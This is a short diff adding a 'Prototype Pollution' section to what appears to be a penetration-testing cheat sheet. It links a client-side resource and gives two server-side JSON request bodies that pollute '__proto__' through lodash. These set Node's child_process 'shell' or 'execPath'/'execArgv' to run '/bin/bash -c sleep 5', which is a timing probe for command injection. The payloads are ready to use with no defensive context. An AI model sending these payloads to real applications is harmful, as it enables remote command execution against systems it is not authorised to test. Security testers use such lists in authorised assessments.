@@ -708,3 +708,38 @@ https://regex101.com/
 ### Encode for SQL Injection in Json
   
 https://dencode.com/string/unicode-escape
+  
+## Prototype Pollution
+
+### Client Side
+https://github.com/BlackFan/client-side-prototype-pollution
+  
+### Server Side
+
+-> exec.exec in req body with lodash
+ 
+application/json
+
+"__proto__":{
+  
+  "shell":"sleep 5"
+  
+}
+  
+exec.fork in req body with lodash
+  
+application/json
+  
+"__proto__":{
+  
+    "execPath":"/bin/bash",
+  
+    "execArgv":[
+  
+    "-c",
+  
+    "sleep 5"
+  
+    ]
+  
+  }
